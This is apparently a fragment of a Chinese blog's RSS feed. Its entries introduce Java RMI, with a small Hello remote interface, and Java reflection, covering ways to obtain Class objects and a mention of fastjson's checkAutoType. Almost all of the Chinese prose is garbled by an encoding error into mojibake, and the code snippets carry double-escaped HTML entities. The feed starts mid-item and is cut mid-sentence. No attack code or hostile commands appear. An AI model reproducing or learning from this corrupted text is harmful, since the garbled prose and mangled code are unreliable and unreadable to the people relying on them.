è¿œç¨‹æ¥å£ï¼ˆRemote Interfaceï¼‰ï¼šå®šä¹‰è¿œç¨‹å¯¹è±¡å¯è°ƒç”¨çš„æ–¹æ³•ã€‚ è¿œç¨‹å¯¹è±¡çš„å®ç°ç±»ï¼ˆRemote Object Implementationï¼‰ã€‚ æœåŠ¡å™¨ï¼ˆServerï¼‰ï¼šæ³¨å†Œè¿œç¨‹å¯¹è±¡åˆ° RMI æ³¨å†Œä¸­å¿ƒã€‚ å®¢æˆ·ç«¯ï¼ˆClientï¼‰ï¼šæŸ¥æ‰¾è¿œç¨‹å¯¹è±¡å¹¶è°ƒç”¨å…¶æ–¹æ³•ã€‚ ç°åœ¨æˆ‘ä»¬æŒ¨ä¸ªå†™å‡ºåˆé€‚çš„ç»„ä»¶ï¼Œå…ˆå†™è¿œç¨‹æ¥å£Hello.javaï¼Œç»§æ‰¿è‡ªRemoteç±»ï¼Œå£°æ˜äº†sayHelloè¿™ä¸ªæ–¹æ³•å¹¶å£°æ˜æŠ›å‡º RemoteExceptionã€‚ï¼ˆå’ŒforNameä¸€æ ·ï¼‰
1 2 3 4 5 6 7 package Base.Rmi; import java.rmi.RemoteException; import java.rmi.Remote; public interface Hello extends Remote { String sayHello(String name) throws RemoteException; } æ¥ç€å†™ä¸ªROIï¼ŒHelloImpl.javaé€šè¿‡ç»§æ‰¿ UnicastRemoteObject å¹¶åœ¨æ„é€ å™¨é‡Œè°ƒç”¨ super()ï¼ŒæŠŠè‡ªå·±å¯¼å‡ºä¸ºå¯è¿œç¨‹è®¿é—®çš„å¯¹è±¡ï¼›å®ç° Hello åˆ™æä¾›äº†å¯ä¾›å®¢æˆ·ç«¯è°ƒç”¨çš„sayHelloæ–¹æ³•ã€‚</description><content:encoded>æ¦‚å¿µ Java RMIï¼ˆRemote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸€ä¸ª Java ç¨‹åºè°ƒç”¨è¿è¡Œåœ¨å¦ä¸€å°è®¡ç®—æœºä¸Šçš„ Java å¯¹è±¡çš„æ–¹æ³•ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·ã€‚ç®€å•æ¥è¯´ï¼ŒRMI æŠŠåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å¯¹è±¡äº¤äº’è¿‡ç¨‹â€œé€æ˜åŒ–â€äº†ï¼Œå¼€å‘è€…ä¸éœ€è¦å…³å¿ƒåº•å±‚çš„ç½‘ â€¦</content:encoded></item><item><title>Javaåå°„</title><link>https://baozongwi.xyz/p/java-reflection/</link><guid>https://baozongwi.xyz/p/java-reflection/</guid><pubDate>Thu, 21 Aug 2025 20:44:15 +0800</pubDate><description>æ¦‚å¿µ Java çš„åå°„ï¼ˆReflectionï¼‰æ˜¯ä¸€ç§åœ¨è¿è¡Œæ—¶åŠ¨æ€è·å–ç±»çš„ä¿¡æ¯ï¼ˆå¦‚ç±»åã€å±æ€§ã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸çŸ¥é“ç±»çš„ç¼–è¯‘æ—¶å®šä¹‰çš„æƒ…å†µä¸‹åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•ã€ä¿®æ”¹å±æ€§çš„æœºåˆ¶ã€‚å®ƒè®©ç¨‹åºå…·å¤‡â€œè‡ªçœèƒ½åŠ›â€ï¼Œå¯ä»¥åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æŸ¥çœ‹å’Œæ“ä½œè‡ªèº«ç»“æ„ã€‚
ç±»æ¯”åˆ° PHPï¼ŒJava çš„åå°„æœºåˆ¶å°±æœ‰ç‚¹åƒ PHP çš„ ReflectionClassã€call_user_funcã€call_user_func_array è¿™äº›å·¥å…·â€”â€”åœ¨ PHP ä¸­ä½ å¯ä»¥é€šè¿‡ç±»åçš„å­—ç¬¦ä¸²æ¥å®ä¾‹åŒ–å¯¹è±¡ã€è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œè€Œä¸éœ€è¦åœ¨ç¼–è¯‘æ—¶æ˜ç¡®å†™æ­»ã€‚
Java çš„åå°„ API æä¾›äº†ä¸€ç³»åˆ—çš„ç±»å’Œæ¥å£æ¥æ“ä½œ Class å¯¹è±¡ã€‚ä¸»è¦çš„ç±»åŒ…æ‹¬ï¼š
java.lang.Classï¼šè¡¨ç¤ºç±»çš„å¯¹è±¡ã€‚æä¾›äº†æ–¹æ³•æ¥è·å–ç±»çš„å­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚ java.lang.reflect.Fieldï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆå±æ€§ï¼‰ã€‚æä¾›äº†è®¿é—®å’Œä¿®æ”¹å­—æ®µçš„èƒ½åŠ›ã€‚ java.lang.reflect.Methodï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ã€‚æä¾›äº†è°ƒç”¨æ–¹æ³•çš„èƒ½åŠ›ã€‚ java.lang.reflect.Constructorï¼šè¡¨ç¤ºç±»çš„æ„é€ å‡½æ•°ã€‚æä¾›äº†åˆ›å»ºå¯¹è±¡çš„èƒ½åŠ›ã€‚ ä¸€èˆ¬åœ°ï¼ŒJava åå°„çš„å·¥ä½œæµç¨‹å°±æ˜¯ï¼šç¨‹åºåœ¨è¿è¡Œæ—¶å…ˆè·å–ç±»çš„ Class å¯¹è±¡ï¼Œå†é€šè¿‡å®ƒæ‰¾åˆ°ç›®æ ‡å­—æ®µ/æ–¹æ³•/æ„é€ å™¨ï¼Œæœ€ååœ¨å¯¹è±¡ä¸ŠåŠ¨æ€è¯»å†™æˆ–è°ƒç”¨ã€‚
å¦å¤–åå°„è¿˜æœ‰å¥½å¤„ï¼Œç»å¸¸åœ¨ä¸€äº›æºç é‡Œçœ‹åˆ°ï¼Œç±»åçš„éƒ¨åˆ†åŒ…å« $ ç¬¦å·ï¼Œæ¯”å¦‚fastjsonåœ¨checkAutoTypeæ—¶å€™å°±ä¼šå…ˆå°† $æ›¿æ¢æˆ.ï¼šhttps://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa stjson/parser/ParserConfig.java#L1038
$ çš„ä½œç”¨æ˜¯æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚ Javaçš„æ™®é€šç±» C1 ä¸­æ”¯æŒç¼–å†™å†…éƒ¨ç±» C2 ï¼Œè€Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š C1.class å’Œ C1$C2.class ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–ä»¬çœ‹ä½œä¸¤ä¸ªæ— å…³çš„ç±»ï¼Œé€šè¿‡ Class.forName(&amp;amp;ldquo;C1$C2&amp;amp;rdquo;) å³å¯åŠ è½½è¿™ä¸ªå†… éƒ¨ç±»ã€‚
æ“ä½œ è·å–å¯¹è±¡ é¦–å…ˆç¬¬ä¸€æ­¥æˆ‘ä»¬å°±æ˜¯è·å–ç±»çš„ Class å¯¹è±¡ï¼Œæ€»çš„æ¥è¯´ï¼Œæœ‰äº”ç§æ–¹æ³•
é€šè¿‡ç±»çš„å­—é¢é‡ï¼šClass&amp;amp;lt;?&amp;amp;gt; clazz = String.class; é€šè¿‡å¯¹è±¡å®ä¾‹ï¼šString str = &amp;amp;quot;Hello&amp;amp;quot;; Class&amp;amp;lt;?&amp;amp;gt; clazz = str.getClass(); é€šè¿‡ Class.forName() æ–¹æ³•ï¼šClass&amp;amp;lt;?&amp;amp;gt; clazz = Class.forName(&amp;amp;quot;java.lang.String&amp;amp;quot;); é€šè¿‡ç±»åŠ è½½å™¨ï¼šClass&amp;amp;lt;?&amp;amp;gt; clazz = ClassLoader.getSystemClassLoader().loadClass(&amp;amp;quot;java.lang.String&amp;amp;quot;); é€šè¿‡åŸºæœ¬ç±»å‹çš„ TYPE å­—æ®µï¼šClass&amp;amp;lt;?&amp;amp;gt; clazz = Integer.TYPE; æ¥ä¸‹æ¥ä½¿ç”¨äº”ç§æ–¹æ³•æ¥å†™demoï¼Œç¬¬ä¸€ç§é€‚ç”¨äºç¼–è¯‘æ—¶å·²çŸ¥ç±»(æ¯”å¦‚Stringç±»)è¿›è¡Œé™æ€å¼•ç”¨ï¼Œç›´æ¥åˆ©ç”¨.classå°±å¯ä»¥è·å–</description><content:encoded>æ¦‚å¿µ Java çš„åå°„ï¼ˆReflectionï¼‰æ˜¯ä¸€ç§åœ¨è¿è¡Œæ—¶åŠ¨æ€è·å–ç±»çš„ä¿¡æ¯ï¼ˆå¦‚ç±»åã€å±æ€§ã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸çŸ¥é“ç±»çš„ç¼–è¯‘æ—¶å®šä¹‰çš„æƒ…å†µä¸‹åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•ã€ä¿®æ”¹å±æ€§çš„æœºåˆ¶ã€‚å®ƒè®©ç¨‹åºå…·å¤‡â€œè‡ªçœèƒ½åŠ›â€ï¼Œå¯ä»¥åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æŸ¥çœ‹å’Œæ“ä½œè‡ªèº«ç»“æ„ã€‚
ç±»æ¯”åˆ° PHPï¼ŒJava â€¦</content:encoded></item></channel></rss>